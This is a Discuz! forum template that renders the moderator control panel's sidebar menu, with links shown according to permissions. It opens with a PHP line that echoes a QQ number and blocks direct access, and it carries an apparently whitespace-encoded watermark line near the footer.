<?php echo 'QQ:2039074300';exit;?>
<!--{template common/header}-->
<div id="pt" class="bm cl">
	<div class="z"><a href="./" class="nvhm" title="{lang homepage}">$_G[setting][bbname]</a> <em>&rsaquo;</em>
		<a href="$_G[setting][navs][2][filename]">$_G[setting][navs][2][navname]</a> <em>&rsaquo;</em>
		<a href="forum.php?mod=modcp">{lang forum_manager}</a>
	</div>
</div>

<div class="bg0 zaobm">
<div id="ct" class="ct2_a wp cl">
	<div class="mn">
		<!--{if $script == 'noperm'}-->
			<div class="bm bw0">
				<h1 class="mt">{lang mod_option_error}</h1>
				<p>{lang mod_error_invalid}</p>
				<p class="notice">{lang mod_notice}</p>
			</div>
		<!--{elseif !empty($modtpl)}-->
			<!--{eval include(template($modtpl));}-->
		<!--{/if}-->
	</div>
	<div class="appl">
		<div class="tbn">
			<h2 class="mt bbda">{lang forum_manager}</h2>
			<ul>
				<li{if $_GET[action] == 'home'} class="a cl"{else} class="cl"{/if}><span class="y mtn">$notenum</span><a href="{$cpscript}?mod=modcp&action=home$forcefid">{lang mod_notice_title}</a></li>
				<!--{if $modforums['fids']}-->
					<!--{if $_G['group']['allowmodpost'] || $_G['group']['allowmoduser']}-->
						<li{if $_GET[action] == 'moderate'} class="a cl"{else} class="cl"{/if}><span class="y mtn">$modnum</span><a href="{$cpscript}?mod=modcp&action=moderate&op={if $_G['group']['allowmodpost'] && $_G['setting']['forumstatus']}threads{$forcefid}{else}members{/if}">{lang forum_moderate}</a></li>
					<!--{/if}-->
				<!--{/if}-->
				<!--{if !empty($_G['setting']['plugins']['modcp_base'])}-->
					<!--{loop $_G['setting']['plugins']['modcp_base'] $id $module}-->
						<li{if $_GET[id] == $id} class="a"{/if}><a href="{$cpscript}?mod=modcp&action=plugin&op=base&id=$id{$forcefid}">$module[name]</a></li>
					<!--{/loop}-->
				<!--{/if}-->
				<!--{if $_G['group']['allowedituser'] || $_G['group']['allowbanuser'] || $_G['group']['allowbanvisituser'] || $_G['group']['allowbanip']}-->
					<!--{if $_G['group']['allowbanuser'] || $_G['group']['allowbanvisituser']}--><li{if $_GET[action] == 'member' && $op == 'ban'} class="a"{/if}><a href="{$cpscript}?mod=modcp&action=member&op=ban$forcefid">{lang mod_option_member_ban}</a></li><!--{/if}-->
					<!--{if $_G['group']['allowbanip']}--><li{if $_GET[action] == 'member' && $op == 'ipban'} class="a"{/if}><a href="{$cpscript}?mod=modcp&action=member&op=ipban$forcefid">{lang mod_option_member_ipban}</a></li><!--{/if}-->
					<!--{if $modforums['fids'] && $_G['setting']['forumstatus']}--><li{if $_GET[action] == 'forumaccess'} class="a"{/if}><a href="{$cpscript}?mod=modcp&action=forumaccess{$forcefid}">{lang mod_option_member_access}</a></li><!--{/if}-->
					<!--{if $_G['group']['allowedituser']}--><li{if $_GET[action] == 'member' && $op == 'edit'} class="a"{/if}><a href="{$cpscript}?mod=modcp&action=member&op=edit$forcefid">{lang mod_option_member_edit}</a></li><!--{/if}-->
				<!--{/if}-->
				<!--{if $modforums['fids'] && $_G['setting']['forumstatus']}-->
					<li{if $_GET[action] == 'thread' || $_GET[action] == 'recyclebin'} class="a"{/if}><a href="{$cpscript}?mod=modcp&action=thread&op=thread{$forcefid}">{lang mod_option_subject}</a></li>
					<!--{if $_G['group']['allowrecommendthread']}--><li{if $_GET[action] == 'forum' && $op == 'recommend'} class="a"{/if}><a href="{$cpscript}?mod=modcp&action=forum&op=recommend&show=all{$forcefid}">{lang mod_option_forum_recommend}</a></li><!--{/if}-->
					<!--{if $_G['group']['alloweditforum']}--><li{if $_GET[action] == 'forum' && $op == 'editforum'} class="a"{/if}><a href="{$cpscript}?mod=modcp&action=forum&op=editforum{$forcefid}">{lang mod_option_forum_edit}</a></li><!--{/if}-->
				<!--{/if}-->
				<!--{if ($_G['group']['allowpostannounce'] && $_G['setting']['forumstatus']) || $_G['group']['allowviewlog']}-->
					<!--{if $_G['group']['allowpostannounce'] && $_G['setting']['forumstatus']}--><li{if $_GET[action] == 'announcement'} class="a"{/if}><a href="{$cpscript}?mod=modcp&action=announcement$forcefid">{lang announcements}</a></li><!--{/if}-->
					<!--{if $_G['group']['allowviewlog']}--><li{if $_GET[action] == 'log'} class="a"{/if}><a href="{$cpscript}?mod=modcp&action=log$forcefid">{lang modcp_logs}</a></li><!--{/if}-->
				<!--{/if}-->
				<!--{if !empty($_G['setting']['plugins']['modcp_tools'])}-->
					<!--{loop $_G['setting']['plugins']['modcp_tools'] $id $module}-->
						<li{if $_GET[id] == $id} class="a"{/if}><a href="{$cpscript}?mod=modcp&action=plugin&op=tools&id=$id">$module[name]</a></li>
					<!--{/loop}-->
				<!--{/if}-->
				<!--{if $_G['setting']['forumstatus']}-->
					<li{if $_GET[action] == 'report'} class="a"{/if}><a href="{$cpscript}?mod=modcp&action=report$forcefid">{lang modcp_report}</a></li>
					<li><a href="{if $forcefid}forum.php?mod=forumdisplay{$forcefid}{else}forum.php{/if}">{lang mod_option_return}</a></li>
				<!--{/if}-->
				<li><a href="{$cpscript}?mod=modcp&action=logout">{lang logout}</a></li>
			</ul>
		</div>
	</div>
</div>
</div>
    		  	  		  	  		     	  		      		   		     		       	  	 	     		   		     		       	  		 	    		   		     		       	  		      		   		     		       	  		 	    		   		     		       	  	  	    		   		     		       	  			     		 	      	  		  	  		     	
<!--{template common/footer}-->